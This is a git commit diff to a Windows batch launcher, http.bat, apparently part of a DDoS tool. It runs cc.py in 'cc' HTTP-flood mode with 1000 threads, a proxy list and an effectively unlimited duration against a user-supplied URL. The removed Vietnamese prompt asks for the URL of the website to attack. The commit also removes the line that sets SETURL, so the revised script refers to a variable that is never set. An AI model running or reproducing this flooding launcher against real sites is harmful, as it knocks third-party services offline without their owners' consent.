271c6496ede22040b2347e469c59bf5f2988739b
Ling <59746573+ndbiaw@users.noreply.github.com>
2022-08-29 05:33:31 +0700

    Fix lỗi hiển thị UTF-8, Fix không chạy vì chưa thêm path python3

--- http.bat
+++ http.bat
@@ -1,4 +1,3 @@
-echo @off
+@echo off
 del http.txt
-set /p SETURL="Nhập URL trang web cần tấn công: "
-python3 cc.py -url %SETURL% -m cc -v http -t 1000 -f http.txt -b 1 -s 999999999999999 -down -check
+python cc.py -url %SETURL% -m cc -v http -t 1000 -f http.txt -b 1 -s 999999999999999 -down -check
